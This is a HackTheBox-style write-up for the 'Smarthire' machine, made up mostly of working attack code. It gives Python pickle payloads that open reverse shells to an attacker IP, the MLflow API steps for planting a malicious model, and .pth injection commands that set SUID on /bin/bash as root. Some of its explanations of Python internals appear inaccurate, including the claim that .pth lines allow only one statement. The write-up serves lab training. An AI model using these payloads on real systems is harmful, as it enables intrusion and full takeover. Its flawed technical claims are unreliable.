# Smarthire — HackTheBox Writeup

## Attack Chain Summary

```
Recon → Web App Enumeration → MLflow RCE (CVE-2024-37054) → Foothold (svcweb)
→ Sudo Privesc via .pth file injection → Root
```

---

## 1. Reconnaissance

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**VHOST discovery** via gobuster:

```
models.smarthire.htb  Status: 401
```

Two attack surfaces: main app at `smarthire.htb` and an MLflow instance at `models.smarthire.htb`.

---

## 2. Web Application Enumeration

The main app is a **Flask**-based HR hiring tool backed by SQLite. It offers registration, login, CSV upload for training ML models, and a `/predict` endpoint.

The subdomain `models.smarthire.htb` is an **MLflow Tracking Server** behind HTTP Basic Auth discovered via the dumped environment file:

```ini
MLFLOW_TRACKING_URI=http://127.0.0.1:5000
MLFLOW_TRACKING_USERNAME=admin
MLFLOW_TRACKING_PASSWORD=password
SMARTHIRE_SECRET_KEY=b9c53f2f4459ee6ed15f7f85c0549861
```

The app database (`smarthire.db`) contains a `users` table with **Werkzeug scrypt** password hashes:

```
scrypt:32768:8:1$<base64_salt>$<hex_hash>
```

These use Werkzeug's default `scrypt` method with N=32768, r=8, p=1 — intentionally strong and impractical to crack.

---

## 3. MLflow RCE — CVE-2024-37054 (Pickle Deserialization)

### The Vulnerability

**MLflow 2.14.1** is vulnerable to **CVE-2024-37054**: unauthenticated pickle deserialization via the model registry API.

### Why Pickle Deserialization is Dangerous

Python's `pickle` module is **not a safe serialization format**. When unpickling data, Python reconstructs objects by calling the `__reduce__` method on the deserialized class. This method returns a tuple of `(callable, args)` that Python calls during unpickling:

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.15.63/4444 0>&1'",))
```

When `pickle.load()` is called on this object, it executes `os.system(command)` — giving us arbitrary code execution on the server.

### Why the MLflow Context Matters

The `/predict` endpoint on the Flask app loads a registered model from MLflow via `mlflow.pyfunc.load_model()`. This function internally calls `cloudpickle.load()` on the model artifact. By uploading a malicious pickle as a model and promoting it to the `Production` stage, the next prediction request triggers deserialization with our payload.

### Exploit Steps

**Step 1:** Generate the malicious pickle:

```python
# generate_model.py
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,sys,os;"
        cmd += "s=socket.socket();s.connect((\"10.10.15.63\",4444));"
        cmd += "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        cmd += "subprocess.call([\"/bin/sh\"])'"
        return (os.system, (cmd,))

with open("model.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

**Step 2:** Upload the model via MLflow's REST API. The key endpoints:

| Endpoint | Purpose |
|---|---|
| `POST /ajax-api/2.0/mlflow/experiments/create` | Create experiment |
| `POST /ajax-api/2.0/mlflow/runs/create` | Create run |
| `PUT /ajax-api/2.0/mlflow-artifacts/artifacts/{exp}/{run}/artifacts/model/model.pkl` | Upload malicious pickle |
| `PUT /ajax-api/2.0/mlflow-artifacts/artifacts/{exp}/{run}/artifacts/model/MLmodel` | Upload metadata |
| `POST /ajax-api/2.0/mlflow/registered-models/create` | Register model |
| `POST /ajax-api/2.0/mlflow/model-versions/create` | Create version pointing to run |
| `POST /ajax-api/2.0/mlflow/model-versions/transition-stage` | Promote to Production |

**Step 3:** Trigger deserialization by calling `/predict`:

```bash
curl -X POST http://smarthire.htb/predict \
  -H "Cookie: session=<session>" \
  -F "file=@sample.csv"
```

The Flask app calls `mlflow.pyfunc.load_model("models:/<model_name>/Production")`, which loads our pickle — **reverse shell as `svcweb`**.

---

## 4. Foothold — svcweb

After catching the shell, enumeration reveals:

```bash
svcweb@smarthire:/var/www/smarthire.htb$ sudo -l
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

This allows `svcweb` to run a specific Python script as **root** with arbitrary arguments.

---

## 5. Privilege Escalation — .pth File Injection

### Why PYTHONPATH Fails

`sudoers` has `env_reset` set, and the sudo rule explicitly blocks dangerous environment variables:

```
sudo PYTHONPATH=/opt/tools/mlflow_ctl/plugins/dev /usr/bin/python3.10 ...
sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```

### Analyzing mlflowctl.py

```python
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
    ...
```

The script:
1. Iterates over subdirectories in `plugins/`
2. Calls `site.addsitedir()` for each — this **appends** them to `sys.path`
3. Then imports `mlflow_actions` and `backup_models`

### The Plugin Directory Structure

```
/opt/tools/mlflow_ctl/plugins/
├── core/   (root:root — contains real mlflow_actions.py)
└── dev/    (root:devs — writable by svcweb via group membership)
```

`svcweb` is in the `devs` group, so `dev/` is writable.

### Why Module Hijacking via the Import Fails

`site.addsitedir()` **appends** to `sys.path`, not prepends. The `core/` directory (containing the real `mlflow_actions.py`) is processed and added first. The `dev/` directory is added after. Since Python searches `sys.path` in order and finds `core/mlflow_actions.py` first, simply placing a file in `dev/` doesn't shadow the legitimate module.

### Why .pth Files Work (The Key Insight)

This is the critical vulnerability. When Python's `site` module calls `site.addsitedir(path)`, it processes any `.pth` files found in that directory. **Lines in `.pth` files that start with `import` are executed by `exec()`** — and this happens at the time the directory is added, before the script's own imports.

The execution flow is:

```
site.addsitedir("plugins/core/")  → no .pth files in core/ → nothing happens
site.addsitedir("plugins/dev/")   → finds trigger.pth
                                   → exec("import exploit")
                                   → loads dev/exploit.py
                                   → os.system("chmod u+s /bin/bash")  ← runs as root!
import mlflow_actions              → already loaded → uses original
import backup_models              → already loaded → uses original
```

Python's `site.py` (line 192) calls `exec(line)` on any line in a `.pth` file that starts with `import`:

```python
# /usr/lib/python3.10/site.py (simplified)
def addpackage(sitedir, name, known_paths):
    for line in f:
        if line.startswith(("#", "\n")):
            continue
        if line.startswith(("import ", "from ")):
            exec(line)  # <-- arbitrary code execution as root
            continue
        # otherwise treat as path to add to sys.path
```

There's no sandbox, no restriction — **the `exec()` runs with full privileges of the calling process**, which in this case is **root** via sudo.

### Exploit Steps

**Step 1:** Create the payload module:

```bash
echo 'import os
os.system("chmod u+s /bin/bash")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.py
```

**Step 2:** Create the `.pth` trigger file:

```bash
echo 'import exploit' > /opt/tools/mlflow_ctl/plugins/dev/trigger.pth
```

**Step 3:** Execute the script via sudo:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

**Step 4:** Root shell:

```bash
bash -p
```

### Why Multiple Files are Needed

The `.pth` file is processed by `exec()` which only accepts a **single statement**. `import os; os.system(...)` is two statements and causes a `SyntaxError`. The solution is:
1. `trigger.pth` contains `import exploit` — a single valid `import` statement
2. `exploit.py` contains the multi-statement logic (import + os.system call)
3. When `trigger.pth` is `exec()`'d, it imports `exploit.py`, which runs the module-level `os.system()` call

---

## 6. Root

```bash
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
92a84183dbd685d275af697b38109a56
```

---

## Key Technical Takeaways

| Attack | Mechanism | Root Cause |
|---|---|---|
| **MLflow RCE** | Pickle `__reduce__` during `load_model()` | Unvalidated pickle deserialization in MLflow < 2.14.3 |
| **Privesc** | `.pth` file `exec()` in `site.addsitedir()` | Python's site module trusts `.pth` file contents implicitly |
| **Defense bypass** | `env_reset` blocks `PYTHONPATH` but not `.pth` | Sudo controls env vars, but can't control Python's internal module loading |
